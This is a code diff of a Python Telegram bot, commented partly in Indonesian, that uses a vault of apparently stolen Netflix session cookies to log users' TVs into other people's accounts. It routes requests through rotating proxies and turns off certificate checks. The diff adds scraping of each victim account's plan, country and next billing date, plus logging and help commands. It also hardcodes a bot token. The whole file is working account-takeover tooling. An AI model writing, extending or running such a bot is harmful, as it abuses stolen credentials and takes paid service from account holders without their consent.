@@ -1,7 +1,10 @@
 #!/usr/bin/env python3
 """
-Netflix TV Code Auto-Login - Telegram Bot (Optimized & Pretty Response)
-Fast, async, multi-user.
+Netflix TV Code Auto-Login - Telegram Bot (Full Features)
+- Optimized & fast
+- Show billing date
+- Help, vault, stats commands
+- Logging to file
 """
 
 import asyncio
@@ -14,6 +17,7 @@ import sys
 import urllib.parse
 import zipfile
 from datetime import datetime
+import logging
 
 import requests
 from urllib3.exceptions import InsecureRequestWarning
@@ -21,18 +25,29 @@ from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 from telegram.constants import ParseMode
 
+# Setup logging
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO,
+    handlers=[
+        logging.FileHandler("bot.log"),
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger(__name__)
+
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 # ══════════════════════════════════════════════════════════════════════
-#  CONFIG - GANTI SESUAI BOT ANDA
+#  CONFIG - GANTI DENGAN TOKEN BARU!!!
 # ══════════════════════════════════════════════════════════════════════
 
-BOT_TOKEN = "8975773812:AAFOXR6W6sVf_uxU_hUXZvWFJEgeQYfsniA"   # <-- REVOKE DAN GANTI!!!
-ADMIN_IDS = [7381245861]   # Ganti dengan ID Telegram Anda
+BOT_TOKEN = "8975773812:AAFOXR6W6sVf_uxU_hUXZvWFJEgeQYfsniA"   # <-- REVOKE DAN GANTI
+ADMIN_IDS = [8975773812]   # Ganti dengan ID Telegram Anda
 
 COOKIES_DIR = "vault"
 PROXY_FILE = "proxy.txt"
-REQUEST_TIMEOUT = 10   # Lebih cepat dari 15
+REQUEST_TIMEOUT = 10
 USER_AGENT = (
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
     "AppleWebKit/537.36 (KHTML, like Gecko) "
@@ -58,7 +73,7 @@ stats = {
 
 
 # ══════════════════════════════════════════════════════════════════════
-#  PROXY (tetap sama)
+#  PROXY (sama)
 # ══════════════════════════════════════════════════════════════════════
 
 def parse_proxy_line(line):
@@ -118,7 +133,7 @@ proxies_list = load_proxies()
 
 
 # ══════════════════════════════════════════════════════════════════════
-#  COOKIE EXTRACTION (sama, tapi dioptimasi sedikit)
+#  COOKIE EXTRACTION (tetap)
 # ══════════════════════════════════════════════════════════════════════
 
 def canonicalize_name(name):
@@ -204,7 +219,7 @@ def extract_cookie_dict(content):
 
 
 # ══════════════════════════════════════════════════════════════════════
-#  COOKIE VALIDATION (lebih cepat)
+#  COOKIE VALIDATION + BILLING DATE
 # ══════════════════════════════════════════════════════════════════════
 
 def validate_cookie(cookies, proxy=None):
@@ -221,20 +236,40 @@ def validate_cookie(cookies, proxy=None):
             headers=headers, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False,
         )
         if r.status_code != 200:
-            return False, None, None
-        country = re.search(r'"currentCountry"\s*:\s*"([^"]+)"', r.text)
+            return False, None, None, None
+        
+        html = r.text
+        
+        # Country
+        country = re.search(r'"currentCountry"\s*:\s*"([^"]+)"', html)
         if not country:
-            country = re.search(r'"countryOfSignup":\s*"([^"]+)"', r.text)
-        if not country:
-            return False, None, None
-        plan = re.search(r'"localizedPlanName"\s*:\s*"([^"]+)"', r.text)
-        return True, country.group(1), plan.group(1) if plan else "Unknown"
-    except:
-        return False, None, None
+            country = re.search(r'"countryOfSignup":\s*"([^"]+)"', html)
+        country_code = country.group(1) if country else None
+        
+        # Plan
+        plan_match = re.search(r'"localizedPlanName"\s*:\s*"([^"]+)"', html)
+        plan = plan_match.group(1) if plan_match else "Unknown"
+        
+        # Billing date (Next payment)
+        billing_match = re.search(
+            r'Next payment</h3>\s*<p[^>]*data-uia="account-membership-page\+payments-card\+description"[^>]*>([^<]+)</p>',
+            html, re.DOTALL | re.IGNORECASE
+        )
+        billing_date = billing_match.group(1).strip() if billing_match else None
+        
+        # Alternative pattern
+        if not billing_date:
+            billing_match = re.search(r'"nextBillingDate"\s*:\s*"([^"]+)"', html)
+            billing_date = billing_match.group(1) if billing_match else "N/A"
+        
+        return True, country_code, plan, billing_date
+    except Exception as e:
+        logger.error(f"Validation error: {e}")
+        return False, None, None, None
 
 
 # ══════════════════════════════════════════════════════════════════════
-#  TV ACTIVATION (error patterns disederhanakan, lebih cepat)
+#  TV ACTIVATION (ringkas)
 # ══════════════════════════════════════════════════════════════════════
 
 def is_tv_code_error(cleaned_text):
@@ -242,19 +277,10 @@ def is_tv_code_error(cleaned_text):
     patterns = [
         r"that code wasn'?t right", r"code (is )?(incorrect|invalid|wrong)", r"try again",
         r"c[oó]digo (es |que ingresaste |no es |incorrecto|inv[aá]lido)",
-        r"c[oó]digo (est[aá] |n[aã]o est[aá] |incorreto|inv[aá]lido)",
-        r"esse c[oó]digo n[aã]o", r"tente novamente",
-        r"code (est |n'est pas |incorrect|invalide)", r"ce code n'est",
-        r"r[ée]essayez", r"code (ist |ung[uü]ltig|falsch)",
-        r"codice (non [eè] |sbagliato|non valido)", r"riprova",
-        r"kod (yanlış|ge[çc]ersiz|hatalı)", r"tekrar dene",
-        r"الرمز (غير صحيح|خطأ|خاطئ)", r"حاول مرة أخرى",
-        r"הקוד (שהזנת |שגוי|לא נכון)", r"כדאי לנסות שוב",
-        r"mã (đó|không đúng|sai)", r"thử lại", r"kod (nieprawidłowy|błędny)",
-        r"spróbuj ponownie", r"код (неверный|неправильный)", r"попробуйте",
-        r"代码(有误|错误|无效)", r"请重试", r"kode (salah|tidak valid)", r"coba lagi",
-        r"รหัส(ไม่ถูกต้อง|ผิด)", r"ลองอีกครั้ง", r"코드(잘못|올바르지 않)", r"다시 시도",
-        r"コード(間違|違|正しく)", r"もう一度", r"कोड (गलत|अमान्य)", r"पुनः प्रयास",
+        r"c[oó]digo (est[aá] |n[aã]o est[aá] |incorreto|inv[aá]lido)", r"tente novamente",
+        r"code (est |n'est pas |incorrect|invalide)", r"code (ist |ung[uü]ltig|falsch)",
+        r"codice (non [eè] |sbagliato|non valido)", r"kod (yanlış|ge[çc]ersiz|hatalı)",
+        r"kode (salah|tidak valid)", r"coba lagi", r"代码(有误|错误|无效)", r"请重试",
     ]
     for pat in patterns:
         if re.search(pat, text_lower):
@@ -268,8 +294,7 @@ def is_tv_code_success(final_url, cleaned_text):
     success_patterns = [
         r"your tv is ready", r"sua tv est[aá] pronta", r"tu tv est[aá] lista",
         r"votre t[ée]l[ée] est pr[eê]t", r"dein tv ist bereit", r"la tua tv [eè] pronta",
-        r"tv'niz hazır", r"הטלוויזיה שלך מוכנ", r"تلفازك جاهز",
-        r"tv của bạn đã sẵn sàng", r"tw[oó]j telewizor jest gotowy",
+        r"tv'niz hazır", r"tv của bạn đã sẵn sàng",
     ]
     for pat in success_patterns:
         if re.search(pat, cleaned_text.lower()):
@@ -282,7 +307,6 @@ def extract_auth_url(html):
         r'name="authURL"\s+value="([^"]+)"',
         r'authURL["\']?\s*[:=]\s*["\']([^"]+)["\']',
         r'authURL=([^&\s"\']+)',
-        r'["\']authURL["\']\s*:\s*["\']([^"\']+)["\']',
         r'value="(c1\.[^"]+)"',
     ]
     for pat in patterns:
@@ -357,7 +381,7 @@ def submit_tv_code(session, tv_code, proxy=None):
 
 
 # ══════════════════════════════════════════════════════════════════════
-#  COOKIE VAULT MANAGEMENT
+#  VAULT
 # ══════════════════════════════════════════════════════════════════════
 
 def get_vault_cookies():
@@ -387,7 +411,7 @@ def count_vault_cookies():
 
 
 # ══════════════════════════════════════════════════════════════════════
-#  ANIMATION (lebih cepat)
+#  ANIMATION
 # ══════════════════════════════════════════════════════════════════════
 
 BRAILLE_FRAMES = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
@@ -408,11 +432,11 @@ async def animate_message(context, chat_id, message_id, stop_event):
         except:
             pass
         frame_idx += 1
-        await asyncio.sleep(0.2)  # Lebih cepat
+        await asyncio.sleep(0.2)
 
 
 # ══════════════════════════════════════════════════════════════════════
-#  BOT COMMANDS (pesan dipercantik)
+#  COMMANDS
 # ══════════════════════════════════════════════════════════════════════
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -423,7 +447,35 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"🎬 <b>Netflix TV Login Bot</b>\n\n"
         f"📺 Use <code>/tv 12345678</code> to activate your TV\n"
         f"🍪 Cookies in vault: <b>{vault_count}</b>\n\n"
-        f"<i>Just send your 8-digit TV code and I'll find a working cookie!</i>",
+        f"🔹 <code>/help</code> for more commands",
+        parse_mode=ParseMode.HTML,
+        reply_to_message_id=update.message.message_id,
+    )
+
+
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    help_text = (
+        "📖 <b>Netflix TV Bot - Help</b>\n\n"
+        "🔹 <code>/tv &lt;8-digit code&gt;</code> – Activate your TV with the code shown on screen.\n"
+        "🔹 <code>/vault</code> – Check how many cookies are left in the vault.\n"
+        "🔹 <code>/stats</code> – Bot statistics (admin only).\n"
+        "🔹 <code>/upload</code> – Add cookies via ZIP file (admin only, reply to a ZIP).\n"
+        "🔹 <code>/start</code> – Welcome message.\n"
+        "🔹 <code>/help</code> – This help.\n\n"
+        "💡 <b>How it works:</b>\n"
+        "• Each cookie is used only once.\n"
+        "• If your TV code is correct and the cookie is valid, your TV will be activated.\n"
+        "• The bot will show you the account's plan, country, and next billing date.\n\n"
+        "⚠️ If you get 'Invalid code', please generate a new code on your TV and try again."
+    )
+    await update.message.reply_text(help_text, parse_mode=ParseMode.HTML, reply_to_message_id=update.message.message_id)
+
+
+async def vault_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Show remaining cookies count (any user)."""
+    count = count_vault_cookies()
+    await update.message.reply_text(
+        f"🍪 <b>Cookies remaining in vault:</b> {count}",
         parse_mode=ParseMode.HTML,
         reply_to_message_id=update.message.message_id,
     )
@@ -489,21 +541,16 @@ async def tv_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             stats["total_logins"] += 1
             stats["successful"] += 1
 
-        # Format pesan sukses seperti yang diminta
         plan = result.get('plan', 'Unknown').upper()
+        country = result.get('country', 'N/A')
         billing = result.get('billing_date', 'N/A')
-        if billing == 'Live':
-            billing = result.get('billing_date_from_cookie', 'N/A')
-        # Coba ambil tanggal dari result (bisa dari cookie atau dari halaman)
-        # Kita sudah punya date dari fungsi check, tapi di sini kita pakai result['billing'] jika ada
-        # Karena di process_tv_login kita tidak set billing, kita bisa ambil dari cookie atau default
-        # Untuk sederhana, kita tampilkan plan dan country
-        country = result.get('country', 'Unknown')
+        
         response = (
             f"🎬 <b>TV Login Done!</b>\n\n"
             f"🔑 <b>Code:</b> <code>{tv_code}</code>\n"
             f"💎 <b>Plan:</b> {plan}\n"
-            f"🌍 <b>Country:</b> {country}\n\n"
+            f"🌍 <b>Country:</b> {country}\n"
+            f"📅 <b>Billing:</b> {billing}\n\n"
             f"✅ <b>TV Connected Successfully</b>\n\n"
             f"Netflix confirmed your login.\n"
             f"Your device is now ready to stream.\n\n"
@@ -563,7 +610,7 @@ def process_tv_login(tv_code):
             continue
 
         proxy = random.choice(proxies) if proxies else None
-        valid, country, plan = validate_cookie(cookies, proxy)
+        valid, country, plan, billing_date = validate_cookie(cookies, proxy)
 
         if not valid:
             continue
@@ -573,9 +620,8 @@ def process_tv_login(tv_code):
         res = submit_tv_code(session, tv_code, proxy)
         res["country"] = country
         res["plan"] = plan
+        res["billing_date"] = billing_date if billing_date else "N/A"
         res["cookie_file"] = filename
-        # Coba ambil billing date dari cookies (optional)
-        res["billing_date"] = "N/A"  # Bisa diperbaiki jika ada di cookie
         return res
 
     return {"success": False, "error": "all_dead"}
@@ -650,7 +696,8 @@ async def upload_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     with open(dest, 'w', encoding='utf-8') as f:
                         f.write(content)
                     added += 1
-                except:
+                except Exception as e:
+                    logger.warning(f"Failed to extract {name}: {e}")
                     skipped += 1
 
         vault_count = count_vault_cookies()
@@ -663,6 +710,7 @@ async def upload_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
     except Exception as e:
+        logger.error(f"Upload error: {e}")
         await status_msg.edit_text(f"❌ <b>Error:</b> {str(e)}", parse_mode=ParseMode.HTML)
 
 
@@ -702,7 +750,7 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 def main():
     print("=" * 50)
-    print("  Netflix TV Login Bot (Optimized & Pretty)")
+    print("  Netflix TV Login Bot - Full Features")
     print("=" * 50)
     print()
 
@@ -717,6 +765,8 @@ def main():
     app = Application.builder().token(BOT_TOKEN).build()
 
     app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("help", help_command))
+    app.add_handler(CommandHandler("vault", vault_command))
     app.add_handler(CommandHandler("tv", tv_command))
     app.add_handler(CommandHandler("upload", upload_command))
     app.add_handler(CommandHandler("stats", stats_command))
